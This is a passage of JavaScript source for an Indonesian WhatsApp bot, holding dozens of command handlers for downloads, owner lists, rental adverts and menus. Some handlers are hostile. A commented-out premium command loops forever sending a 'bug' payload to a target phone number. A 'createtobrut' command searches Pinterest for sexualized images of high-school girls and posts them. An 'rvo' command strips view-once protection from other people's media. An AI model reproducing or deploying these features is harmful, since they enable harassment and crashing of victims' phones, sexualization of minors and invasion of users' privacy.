if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
        case 'listowner': {
                let teks = '┌──⭓「 *List Owner* 」\n│\n'
                for (let x of owner) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${owner.length}*`
                reply(teks)
            }
            break
        case 'request': case 'repot': case 'reportbug': {
	if (!text) return reply(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `『 Laporan 』`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${pushname},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
                conn.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            conn.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
       /* case 'gada-ampun': case 'hitam': case 'bug-24j': {
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(mess.bugrespon)
for (;;) {
await ngeloc(target, force)
await sleep(30000)
}
}
break*/
        
case 'hitam2':
await reply(mess.bugrespon)
m.reply('terkentod🗿🚬')
break
case 'ven':
reply('tes')
break
case "gpt4": case "ai2":
if (!text) return reply('Mau Nanya apa bang?')
try {
let cct = await fetchJson(`https://widipe.com/gpt4?text=${text}`)
let resq = cct.result
reply(`${resq}`)
} catch (err) {
m.reply('Website Nya error')
}
break
case 'apakah': {
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
break
case 'bisakah': {
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
}
break
case 'bagaimanakah': case 'bagaimana': {
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Yang Sabar Ya Bos:(', 'Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
}
break

case 'ig': {
 if (!m.isGroup) return reply(`Maaf Kak Fitur Ini Khusus Untuk Di dalam group, Anda bisa join ke group bot
https://chat.whatsapp.com/IjIKrz71wmY8E7WIxmnkpe`)
 if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
 let ig = await fetchJson(`https://api.kyuurzy.site/api/download/igdl?query=${text}`)
 let url = ig.result.media
 if (!url.length == 1) {
 if (m.isGroup) {
 ig.result.media.forEach(async (k) => {
 await conn.sendMessage(m.sender, {
 image: {
 url: k
 }
 }, {
 quoted: m
 });
 })

 m.reply(`All photos have been sent to your private chat`)
 } else {
 ig.result.media.forEach(async (k) => {
 await conn.sendMessage(from, {
 image: {
 url: k
 }
 }, {
 quoted: m
 });
 })
 }
 } else {
 conn.sendMessage(m.chat, {
 video: {
 url: ig.result.media[0]
 },
 caption: mess.done },
 { quoted: m })
 }
 }
 break

case "sewabot2": case "nyewa": case "ewa": {


await loading()

const url1 = `https://telegra.ph/file/743d049ec937296ddfbe7.jpg`;
const url2 = `https://telegra.ph/file/743d049ec937296ddfbe7.jpg`;
const url3 = `https://telegra.ph/file/743d049ec937296ddfbe7.jpg`;

async function image(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: { url }
 }, {
 upload: conn.waUploadToServer
 });
 return imageMessage;
}

let msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: { text: `Hai kak ${pushname}, Mau sewa Bot Kami ?, Lihat dan pilih, Klik Link Di bawah foto nya ya` },
 carouselMessage: {
 cards: [
 {
 header: {
 imageMessage: await image(url1),
 hasMediaAttachment: true,
 },
 body: { text: "*- 1 Minggu -*\n• Price: 8k\n• Akses: Premium\n\n• Discount: 5k For Next Buy" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"Sewa","url":"https://wa.me/6287826292008?text=Bang+Mau+Sewa+Bot+Cyyxero+1+Minggu","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url2),
 hasMediaAttachment: true,
 },
 body: { text: "*- 3 Minggu -*\n• Price: 15k\n• Akses: Premium\n\n• Discount: 10k For Next Buy" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"Sewa","url":"https://wa.me/6287826292008?text=Bang+Mau+Sewa+Bot+Cyyxero+3+Minggu","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url3),
 hasMediaAttachment: true,
 },
body: { text: "*- 2 Bulan -*\n• Price: 31k\n• Akses: Premium\n\n• Discount: 24k For Next Buy" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"Sewa","url":"https://wa.me/6287826292008?text=Bang+Mau+Sewa+Bot+Cyyxero+2+bulan","webview_presentation":null}',
 },
 ],
 },
 },
 
 ],
 messageVersion: 1,
 },
 },
 },
 },
 },
 {}
);

await conn.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id,
});
}
break

case 'pinv2': case 'pinterestv2': case 'pinterest2': {
 if (!text) return reply(`Enter Query`);
 //try {
 await m.reply('*[ Loading ]* Please Wait');

 async function createImage(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: {
 url
 }
 }, {
 upload: conn.waUploadToServer
 });
 return imageMessage;
 }

 function shuffleArray(array) {
 for (let i = array.length - 1; i > 0; i--) {
 const j = Math.floor(Math.random() * (i + 1));
 [array[i], array[j]] = [array[j], array[i]];
 }
 }

 let push = [];
 let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
 let res = data.resource_response.data.results.map(v => v.images.orig.url);

 shuffleArray(res); // Mengacak array
 let ult = res.splice(0, 10); // Mengambil 10 gambar pertama dari array yang sudah diacak
 let i = 1;

 for (let pus of ult) {
 push.push({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `Image ke - ${i++}`
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 text: ''
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: 'Hasil.',
 hasMediaAttachment: true,
 imageMessage: await createImage(pus)
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
 {
 "name": "cta_url",
 "buttonParamsJson": `{"display_text":"url","url":"${pus}","merchant_url":"https://www.google.com"}`
 }
 ]
 })
 });
 }

 const msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.create({
 text: 'Hai\nDibawah ini Adalah hasil dari Pencarian Kamu'
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: global.namabot
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: [
 ...push
 ]
 })
 })
 }
 }
 }, {});

 await conn.relayMessage(m.chat, msg.message, {
 messageId: msg.key.id
 });
 
}
		 break

case 'spotify': {
if (!text) return reply(`Contoh : ${prefix + command} tada koe hitotsu`)
reply('*Sek loading*')
let api = await fetchJson(`https://api.junn4.my.id/search/spotify?query=${text}`);
const hasil = `乂 *S P O T I F Y*

*Title*: ${api.data[0].title}
*Duration*: ${api.data[0].duration}
*Popular*: ${api.data[0].popularity}
*Url*: ${api.data[0].url}
`
conn.sendMessage(m.chat, {text: hasil, contextInfo:
{
"externalAdReply": {
"title": 'sᴘᴏᴛɪғʏ ʙʏ ᴄʏʏxᴇʀᴏ ᴀɪ',
"body": `ᴄʏʏxᴇʀᴏ ᴀɪ`,
"showAdAttribution": true,
"mediaType": 1,
"sourceUrl": '',
"thumbnailUrl": 'https://telegra.ph/file/50afb355fac55370492de.jpg',
"renderLargerThumbnail": true
}
}}, {quoted: m})
const spodl = await fetchJson(`https://api.junn4.my.id/download/spotify?url=${api.data[0].url}`) 
const spoDl = spodl.data.download
conn.sendMessage(m.chat, {
audio: {
url: spoDl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `ꜱᴘᴏᴛɪꜰʏ ʙʏ ᴄʏʏxᴇʀᴏ ᴀɪ`,
body: "",
thumbnailUrl: 'https://telegra.ph/file/d8283bf6f948413ad0e62.jpg', 
sourceUrl: hariini,
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
}
break

case 'mediafire': {
 if (!isPrem) return reply(mess.prem)
 	if (!args[0]) return reply(`Enter the mediafire link next to the command`)
 if (!args[0].match(/mediafire/gi)) return reply(`Link incorrect`)
 const { mediafiredl } = require('@bochilteam/scraper')
 let full = /f$/i.test(command)
 let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
 let res = await mediafiredl(args[0])
 let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
 let caption = `
 ≡ *MEDIAFIRE*

▢ *Number:* ${filename}
▢ *Size:* ${filesizeH}
▢ *Extension:* ${ext}
▢ *Uploaded:* ${aploud}
`.trim()
 conn.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
 }
 break

case 'leave':
 case 'out':
 if (!isCreator) return reply(mess.owner)
 if (!m.isGroup) return reply('khusus group')
 reply('Bye Everyone 🥺')
 await conn.groupLeave(m.chat)
 break



case 'tqto': 
 case 'thanksto': 
 
 conn.relayMessage(m.chat, {
 "requestPaymentMessage": {
 amount: {
 value: 2022000,
 offset: 0,
 currencyCode: 'IDR'
 },
 amount1000: 999999999,
 background: null,
 currencyCodeIso4217: 'USD',
 expiryTimestamp: 0,
 noteMessage: {
 extendedTextMessage: {
 text: 
 
 `
⊱━━━ THANKS TO━━━⊰

• Dich (developer bot/kang copas)
 • Fauzan (penyedia base)
• Xeon (support)
• DitzzXploit (support)
• kizh (support)
• Adrian (support)
• all member (yang udh bantu fix SC/fitur bot)

 
 Terima Kasih Pada Yang Sudah Membantu Membuat Bot😗
 
 ┗━━━━ ${global.botname} ━━━┛
 `
 }
 },
 requestFrom: m.sender
 }
 }, {})
break

case "createtobrut": {
if (!isCreator) return reply(`khusus Ayang Dich🥺`)
 reply('*Sabar aku create tobrut nya😈*');
 const createImage = async (url) => {
 const { imageMessage } = await baileys.generateWAMessageContent({
 image: {
 url
 }
 }, {
 upload: conn.waUploadToServer
 });
 return imageMessage;
 };
 async function pinterest(query) {
 let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
 let json = await res.json();
 let data = json.resource_response.data.results;
 if (!data.length) reply(`Query "${query}" not found :/`);
 return data[~~(Math.random() * data.length)].images.orig.url;
 }
 const imageUrls = [];
 for (let i = 0; i < 10; i++) {
 const imageUrl = await pinterest('tobrut anak sma');
 imageUrls.push(imageUrl);
 }
 const cards = await Promise.all(imageUrls.map(async (url, index) => ({
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Image ${index + 1}`,
 hasMediaAttachment: true,
 imageMessage: await createImage(url)
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [] // Hapus semua tombol
 })
 })));
 const msg = baileys.generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `Nih seng pilih aja`
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards
 })
 })
 }
 }
 }, {});

 await conn.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });
};
break


case'ytmp42':{
if (!text) return m.reply(` ytmp4 link`)
conn.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
try {
let obj = await ytmp3(text);
conn.sendMessage(m.chat, { video: { url: obj.mp4DownloadLink }, mimetype: 'video/mp4', fileName: `youtube.mp4` })
} catch (err) {
console.error(err);
m.reply(`eror 🗿`);
}

async function ytmp3(videoUrl) {
 return new Promise(async (resolve, reject) => {
 try {
 const searchParams = new URLSearchParams();
 searchParams.append('query', videoUrl);
 searchParams.append('vt', 'mp3');
 const searchResponse = await axios.post(
 'https://tomp3.cc/api/ajax/search',
 searchParams.toString(),
 {
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Accept': '*/*',
 'X-Requested-With': 'XMLHttpRequest'
 }
 }
 );
 if (searchResponse.data.status !== 'ok') {
 throw new Error('Failed to search for the video.');
 } 
 const videoId = searchResponse.data.vid;
 const videoTitle = searchResponse.data.title;
 const mp4Options = searchResponse.data.links.mp4;
 const mp3Options = searchResponse.data.links.mp3;
 const mediumQualityMp4Option = mp4Options[136]; 
 const mp3Option = mp3Options['mp3128']; 
 const mp4ConvertParams = new URLSearchParams();
 mp4ConvertParams.append('vid', videoId);
 mp4ConvertParams.append('k', mediumQualityMp4Option.k);
 const mp4ConvertResponse = await axios.post(
 'https://tomp3.cc/api/ajax/convert',
 mp4ConvertParams.toString(),
 {
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Accept': '*/*',
 'X-Requested-With': 'XMLHttpRequest'
 }
 }
 );
 if (mp4ConvertResponse.data.status !== 'ok') {
 throw new Error('Failed to convert the video to MP4.');
 }
 const mp4DownloadLink = mp4ConvertResponse.data.dlink;
 const mp3ConvertParams = new URLSearchParams();
 mp3ConvertParams.append('vid', videoId);
 mp3ConvertParams.append('k', mp3Option.k);
 const mp3ConvertResponse = await axios.post(
 'https://tomp3.cc/api/ajax/convert',
 mp3ConvertParams.toString(),
 {
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'Accept': '*/*',
 'X-Requested-With': 'XMLHttpRequest'
 }
 }
 );
 if (mp3ConvertResponse.data.status !== 'ok') {
 throw new Error('Failed to convert the video to MP3.');
 }
 const mp3DownloadLink = mp3ConvertResponse.data.dlink;
 resolve({
 title: videoTitle,
 mp4DownloadLink,
 mp3DownloadLink
 });
 } catch (error) {
 reject('Error: ' + error.message);
 }
 });
}
};
break

case 'assalamualaikum': case "assalamu'alaikum":
 reply(`*Waalaikummussalam warahmatullahi wabarokatuh*


_📚 Baca yang dibawah ya!_
"Orang yang mengucapkan salam seperti ini maka ia mendapatkan 30 pahala, kemudian, orang yang dihadapan atau mendengarnya membalas dengan kalimat yang sama yaitu “Wa'alaikum salam warahmatullahi wabarakatuh” atau ditambah dengan yang lain (waridhwaana). Artinya selain daripada do'a selamat juga meminta pada Allah SWT"`)
 break

case 'asu': case 'celeng': case 'anj': case 'anjir': case 'kontol': case 'pukimak': case 'babi': case 'yatim': case 'tolol': case 'lol': case 'memek': 
reply(`*Hei Kamu Yang Berkata Kasar*


_📚 Baca yang dibawah ya!_
"Tidaklah dia menyadari bahwa sesungguhnya Allah SWT melihat segala perbuatannya?"
(Q.s Al-alaq:14)`)
break

case "ssweb": {
				if (!text) return m.reply(`Example: ${prefix + command} https://github.com/nazedev/naze-md`)    
				if (!text.startsWith('http')) {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/https://' + q;
					await conn.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				} else {
					let buf = 'https://image.thum.io/get/width/1900/crop/1000/fullpage/' + q;
					await conn.sendMessage(m.chat, { image: { url: buf }, caption: 'Done' }, { quoted: m })
				}
			}
			break

case "kk":
m.reply('p')
break

case 'test': {
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: "test"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "test"
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: "test",
 subtitle: "test",
 hasMediaAttachment: false
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "single_select",
 "buttonParamsJson": "{\"title\":\"title\",\"sections\":[{\"title\":\"title\",\"highlight_label\":\"label\",\"rows\":[{\"header\":\"header\",\"title\":\"title\",\"description\":\"description\",\"id\":\"id\"},{\"header\":\"header\",\"title\":\"title\",\"description\":\"description\",\"id\":\"id\"}]}]}"
 },
 {
 "name": "quick_reply",
 "buttonParamsJson": "{\"display_text\":\"quick_reply\",\"id\":\"owner\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"url\",\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
 },
 {
 "name": "cta_call",
 "buttonParamsJson": "{\"display_text\":\"call\",\"id\":\"message\"}"
 },
 {
 "name": "cta_copy",
 "buttonParamsJson": "{\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"message\"}"
 },
 {
 "name": "cta_reminder",
 "buttonParamsJson": "{\"display_text\":\"cta_reminder\",\"id\":\"message\"}"
 },
 {
 "name": "cta_cancel_reminder",
 "buttonParamsJson": "{\"display_text\":\"cta_cancel_reminder\",\"id\":\"message\"}"
 },
 {
 "name": "address_message",
 "buttonParamsJson": "{\"display_text\":\"address_message\",\"id\":\"message\"}"
 },
 {
 "name": "send_location",
 "buttonParamsJson": ""
 }
 ],
 })
 })
 }
 }
}, {})
 
await conn.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break

case 'cgc':
 {
 let eek = m.sender;
 conn.sendMessage(m.chat, {
 react: {
 text: '⏳',
 key: m.key
 }
 });
 let pesan = "*Haloo Kak " + pushname + "*\n*Mau Create Group Di Cyyxero?, Langsung saja pilih dibagian list Paket Mingguan ≧﹏≦*\n";
 let msg = generateWAMessageFromContent(from, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 0x2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: pesan
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "🚩Jika ragu kami juga mempunyai testimoni yang bisa dilihat sendiri di saluran whatsapp kami maupun instagram ⌓̈⃝୨\n"
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 ...(await prepareWAMessageMedia({
 image: fs.readFileSync('./database/base/image/add.jpg')
 }, { upload: conn.waUploadToServer })),
 title: '',
 gifPlayback: true,
 subtitle: ownername,
 hasMediaAttachment: false
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [{
 name: 'single_select',
 buttonParamsJson: JSON.stringify({
 title: "LIST CREATE GROUP",
 sections: [{
 title: "PILIH PAKET MANA YG MAU KAMU CREATE GROUP NYA",
 rows: [{
 header: "GROUP 1 MINGGU ✨",
 title: "Click Here!!",
 description: "Group paket 1 Minggu",
 id: "sewabot 1 minggu", 
 }, {
 header: "GROUP 2 MINGGU ✨",
 title: "Click Here!!",
 description: "Group Paket 2 Minggu",
 id: "sewabot 2 minggu", 
 }, {
 header: "GROUP 3 MINGGU ✨",
 title: "Click Here!!",
 description: "Group Paket 3 Minggu",
 id: "sewabot 3 Minggu", 
 }]
 }]
 })
 }, {
 name: 'quick_reply',
 buttonParamsJson: JSON.stringify({
 display_text: "PAYMENT💰",
 id: "nope"
 })
 }, {
 name: 'quick_reply',
 buttonParamsJson: JSON.stringify({
 display_text: "OWNER👥",
 id: "owner"
 })
 }]
 })
 })
 }
 }
 }, {
 userJid: from,
 quoted: m
 });
 await conn.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
 }
 break


case "tid":
reply('njay')
break


case "menux1":
reply(`Hello ${pushname}👋 


*Download Menu*
- .aio
- .gitclone
- .instagram
- .tiktok


*Convert Menu*
- .sticker
- .toimage


*Group Menu*
- .add
- .afk
- .aproveall
- .afk
- .hidetag
- .kick
- .linkgc
- .reject


*Informasi Menu*
- .owner
- .runtime
- .ping
- .statserver
- .totalfitur


*Main Menu*
- .menu
- .tqto


*Owner Menu*
- .addowner
- .backup
- .banchat
- .broadcast
- .clearsesi
- .delplugin
- .delowner
- .getplugins
- .setplugin
- .setppbot
- .banchat


*Tools Menu*
- .gempa
- .get
- .goole
- .inspect
- .lyrics
- .rvo
- .servermc
- .ssweb
- .goole`)
break







case "ttsearch": {
 if (!text) return m.reply(`Contoh ${command} sholawat`)
let ttsearch = await fetchJson(`https://api.junn4.my.id/search/tiktoksearch?query=${text}`)
 await conn.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
conn.sendMessage(m.chat, { video: { url: ttsearch.result.no_watermark}, caption: ttsearch.result.title}, {quoted: m})
conn.sendMessage(m.chat, { 
 audio: { url: ttsearch.result.music }, 
 fileName: `tiktok.mp3`, 
 mimetype: 'audio/mp4'
 }); 
 await conn.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}}) 
 }
 break



case "rvo":{
 
 if (!m.quoted) return reply ('Reply gambar/video yang ingin Anda lihat')
 if (m.quoted.mtype !== 'viewOnceMessageV2') return reply ('Ini bukan pesan viewonce.')
 try {
 let msg = m.quoted.message
 let type = Object.keys(msg)[0]
 let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
 let buffer = Buffer.from([])
 for await (const chunk of media) {
 buffer = Buffer.concat([buffer, chunk])
 }
 if (/video/.test(type)) {
 return conn.sendMessage(from, { video: buffer}, 'media.mp4', msg[type], {caption: ''}, {quoted: m})
 } else if (/image/.test(type)) {
 return conn.sendMessage(from, {image: buffer}, 'media.jpg', msg[type], {caption : ''}, {quoted: m})
 }
 } catch (e) {
 console.log(e)
 m.reply(`Sistem *Error*`)
 }
}
break



case "ytmp31":
 
if (!text) return reply('Link salah kocak. Masukin yang bener')
 try {
 var audioUrl;
 try {
 audioUrl = `https://widipe.com/downloadAudio?URL=${text}&videoName=ytdl`;
 } catch (e) {
 m.reply('Please wait...')
 audioUrl = `https://widipe.com/youtube?url=${text}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`;
 }

 var caption = `∘ Url : ${text}\n∘ Mohon Sabar Kak, Sedang download audio`;

 var pesan = conn.relayMessage(m.chat, {
 extendedTextMessage: {
 text: caption,
 contextInfo: {
 externalAdReply: {
 title: "Powered by Ranz",
 mediaType: 1,
 previewType: 0,
 renderLargerThumbnail: true,
 thumbnailUrl: "https://telegra.ph/file/4a13b6fe49b03e1efb7a0.jpg",
 sourceUrl: 'https://wa.me/6285624010729'
 }
 },
 mentions: [m.sender]
 }
 }, {});

 conn.sendMessage(m.chat, {
 audio: { url: audioUrl },
 mimetype: 'audio/mpeg',
 contextInfo: {
 externalAdReply: {
 title: "Done by Bochi - Botz",
 body: "Halo Kak 🤗",
 thumbnailUrl: "https://telegra.ph/file/4a13b6fe49b03e1efb7a0.jpg",
 sourceUrl: 'https://wa.me/6285624020729',
 mediaType: 1,
 showAdAttribution: true,
 renderLargerThumbnail: true
 }
 }
 }, { quoted: m })
 } catch (e) {
 m.reply(`*Error:* ${e.message}`)
 }

    break


case "ytmp41":

 if (!text) return reply('Link Nya salah, Masukin yang bener Kak')
 try {
 var videoUrl;
 try {
 videoUrl = `https://widipe.com/downloadVideo?URL=${text}&videoName=ytdl`;
 } catch (e) {
 m.reply( '⏳ Please wait...');
 videoUrl = `https://widipe.com/youtube?url=${text}&filter=videoonly&quality=highestvideo&contenttype=video/mp4`;
 }

 var caption = `∘ Url : ${text}\n∘ Mohon Sabar Kak Sedang download video.`;

 var pesan = conn.relayMessage(m.chat, {
 extendedTextMessage: {
 text: caption,
 contextInfo: {
 externalAdReply: {
 title: "Powered by Ranz",
 mediaType: 1,
 previewType: 0,
 renderLargerThumbnail: true,
 thumbnailUrl: "https://telegra.ph/file/4a13b6fe49b03e1efb7a0.jpg",
 sourceUrl: 'https://wa.me/6285624020729'
 }
 },
 mentions: [m.sender]
 }
 }, {})

 conn.sendMessage(m.chat, {
 video: { url: videoUrl },
 mimetype: 'video/mp4',
 contextInfo: {
 externalAdReply: {
 title: "Done by Bochi - Botz",
 body: "Halo Kak 🤗",
 thumbnailUrl: "https://telegra.ph/file/4a13b6fe49b03e1efb7a0.jpg",
 sourceUrl: 'https://wa.me/6285624010729',
 mediaType: 1,
 showAdAttribution: true,
 renderLargerThumbnail: true
 }
 }
 }, { quoted: m })
 } catch (e) {
 m.reply(`*Error:* ${e.message}`, m);
 }

break

case "pok":
if (global.db.data.users[m.sender].limit < 3) return reply(mess.endLimit)
db.data.users[m.sender].limit -= 2
reply("p0")
break





case 'cek':
let totalusernya = db.data.users[0]
let profile = db.data.users[sender]
reply(`「 *Info User* 」
⭔Nama Pengguna : *@${sender.split('@')[0]}*
⭔Premium : ${isPrem ? '✅' : '❎'}
⭔Limit : ${profile.limit}
⭔Uangmu : ${getMonay(m.sender)}
⭔Status : Terdaftar di database ✅`)
break

case "rules":
reply(`┏━━━°❀ ❬ *Rules Penggunaan XeroBotz-ID* ❭ ❀°━━━┓

1. ✧ *Dilarang Melakukan Spam Kepada Bot*, Jika Ketahuan Akan Di Banned.

2. ✧ Jika Bot Tidak Menjawab 1x, Silahkan Dicoba Lagi. Tapi Jika Bot Tidak Menjawab 2x, Itu Artinya Delay, Jangan Dipakai Dulu.

3. ✧ *Jangan Spam Bot, Kalau Belum Donasi, Sadar Diri Aja Makenya* :)

4. ✧ Jika Limit Habis, Silahkan Bermain Game Untuk Mendapatkan Exp. Contoh Game: Tebak-Tebakan, RPG Game, dll.

5. ✧ *Dilarang Mengirim Virtex/Bug Ke Bot*, Walaupun Tidak Ada Efeknya :v

6. ✧ *Dilarang Keras Menelpon Bot*, Jika Menelpon Akan Otomatis Diblokir.

7. ✧ Jika Tidak Mengerti Cara Menggunakan Bot, Silahkan Bertanya Pada Member Lain. Atau Jika Belum Join Group Bot, Ketik #gcbot Dan Masuk Group Bot.

8. ✧ Jika Ada Fitur Error/Tidak Mengerti Cara Menggunakannya, Silahkan Laporkan/Tanyakan Kepada Owner.

9. ✧ Jika Bot Delay, Jangan Di Spam Terlebih Dahulu.

10. ✧ Untuk User *Premium*, *Dilarang Keras Mengirim Bug Asal Ke Orang Lain*.

┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`)
break

case "totalfitur":
 reply(`hallo kak ${pushname}\n jadi ${botname} memiliki total fitur ${totalfitur()}
bantu support dan donasinya biar fitur nya 
tambah banyak yaa..... terimakasih.🔥🔥`)
 break

/*case 'waifu2':
 let res = await fetch('https://api.waifu.pics/sfw/waifu')
 if (!res.ok) throw await res.text()
 let json = await res.json()
 if (!json.url) throw 'Error!'
 conn.sendFile(m.chat, json.url, 'waifu.jpg', 'Istrinya Kartun🐧', m)
break

case "waifu3":
 let asuu = await fetch('https://api.waifu.pics/sfw/waifu')
 if (!res.ok) throw await res.text()
 let json = await res.json()
 if (!json.url) throw 'Error!'
 conn.sendMessage(m.chat, { image: json.url }, { quoted: m })
break*/


case "neko":{
let gatauiniapa = await fetch(`https://api.waifu.pics/sfw/${command}`)
let hmmm = await gatauiniapa.json()
 conn.sendMessage(m.chat, { image: { url: hmmm.url}, caption: `Sukses tapi lu jan ngaceng woy`})
 }
        break

case "rn": case "runtime":

let aktipp = `┌─ ⏳ *DASHBOARD* ─┐
│
├─ ❖ *BotName*: ${botname}
├─ ❖ *Runtime*: ${runtime(process.uptime())} 
├─ ❖ *Time*: ${time}
├─ ❖ *Day*: ${hariini}
│
└─ ✨ Terima kasih telah menggunakan *${botname}*! 🌟`
reply(aktipp)
break

case 'zya2':{
